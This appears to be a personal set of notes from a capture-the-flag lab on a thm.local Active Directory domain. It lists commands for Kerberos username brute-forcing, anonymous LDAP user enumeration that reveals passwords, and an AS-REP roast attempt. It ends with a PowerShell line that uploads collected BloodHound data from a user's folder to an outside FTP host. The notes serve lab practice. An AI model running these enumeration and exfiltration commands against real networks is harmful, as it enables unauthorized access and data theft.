`kerbrute userenum -d thm.local --dc 10.201.40.246 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt `
 => Revleas `greg@thm.local`

# More users with LDAP
----
- `/windapsearch.py --dc-ip 10.201.40.246 -u "" -U | grep userPrincipalName: | awk '{print $2}' | cut -d "@" -f1`
- `nxc ldap labyrinth.thm.local -u 'guest' -p '' --users`
	- Reveals Passwords

# ASREP Roast
---
- Nothing found here

# BLOODHOUND
----
- `(New-Object Net.WebClient).UploadFile('ftp://10.11.135.80/THMLOCAL.zip', 'C:\Users\SUSANNA_MCKNIGHT\20250819151314_THMLOCAL.zip')`